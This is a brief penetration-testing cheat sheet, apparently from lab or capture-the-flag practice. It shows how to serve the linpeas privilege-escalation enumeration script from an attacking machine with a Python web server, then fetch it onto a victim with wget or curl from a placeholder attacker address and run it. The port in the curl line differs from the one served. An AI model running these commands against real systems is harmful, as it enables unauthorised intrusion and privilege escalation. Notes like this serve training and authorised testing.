Attacking machine – Navigate to linpeas folder
`python -m SimpleHTTPServer 9500`
or
`python3 -m http.server 9500`

Victim machine
`wget <tun0_ip>:9500/linpeas.sh`
`chmod +x linpeas.sh`
`./linpeas.sh 2>/dev/null`


if wget doesn’t work

`curl <tun0_ip>:8080/linpeas.sh -O`
`-o <filename>` to use a different filename
